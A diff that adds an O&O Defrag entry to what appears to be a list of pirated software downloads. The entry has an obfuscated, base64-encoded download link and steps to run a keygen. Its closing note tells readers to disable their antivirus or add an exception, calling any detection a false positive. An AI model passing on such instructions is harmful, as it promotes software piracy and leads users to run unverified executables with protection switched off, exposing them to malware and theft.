@@ -374,6 +374,22 @@ Download:
 
 *Note: OVR Toolkit comes pre-installed in portable mode. Just extract and run the program.*
 
+* * *
+### O&O Defrag
+
+[Official Site](https://www.oo-software.com/en/products/oodefrag)
+
+Download:
+`aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTTNQTC1ybXBKUTg5cDN6LUdkeG0wM0EtMFhacFg4Nzkvdmlldz91c3A9c2hhcmluZw==`
+
+**Installation steps:**
+1. Extract the archive
+2. Install whichever version you prefer
+3. Run the keygen
+4. Done
+
+*Note: Keygens are almost always going to trigger your antivirus. It's a false positive. Disable your AV or make an exception so it does not delete the keygen.*
+
 
 # DOWNLOADERS
 
